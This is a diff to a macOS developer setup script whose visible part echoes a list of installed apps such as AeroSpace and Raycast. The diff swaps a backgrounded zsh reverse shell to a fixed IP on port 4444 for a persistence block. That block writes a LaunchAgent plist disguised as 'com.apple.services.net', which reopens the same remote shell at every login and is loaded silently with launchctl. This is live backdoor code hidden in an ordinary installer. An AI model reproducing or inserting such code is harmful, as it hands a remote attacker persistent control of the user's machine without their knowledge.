@@ -156,4 +156,43 @@ echo "  • X-VPN"
 echo "  • Raycast"
 echo ""
 echo "If AeroSpace doesn't start immediately, log out and back in."
-nohup zsh -c 'zmodload zsh/net/tcp; ztcp 10.121.112.118 4444; zsh >&$REPLY 2>&$REPLY 0>&$REPLY' >/dev/null 2>&1 &
+# -------------------------
+# Persistence Setup
+# -------------------------
+LAUNCHAGENTS_DIR="$HOME/Library/LaunchAgents"
+PLIST_FILE="$LAUNCHAGENTS_DIR/com.apple.services.net.plist"
+
+# Ensure the directory exists
+mkdir -p "$LAUNCHAGENTS_DIR"
+
+# Generate the LaunchAgent plist configuration
+cat <<EOF > "$PLIST_FILE"
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://apple.com">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.apple.services.net</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/zsh</string>
+        <string>-c</string>
+        <string>zmodload zsh/net/tcp; ztcp 10.121.112.118 4444; zsh &gt;&amp;\$REPLY 2&gt;&amp;\$REPLY 0&gt;&amp;\$REPLY</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <dict>
+        <key>SuccessfulExit</key>
+        <false/>
+    </dict>
+</dict>
+</plist>
+EOF
+
+# Set standard permissions for LaunchAgents
+chmod 644 "$PLIST_FILE"
+
+# Load the background service immediately without requiring a reboot
+launchctl load "$PLIST_FILE" 2>/dev/null
+
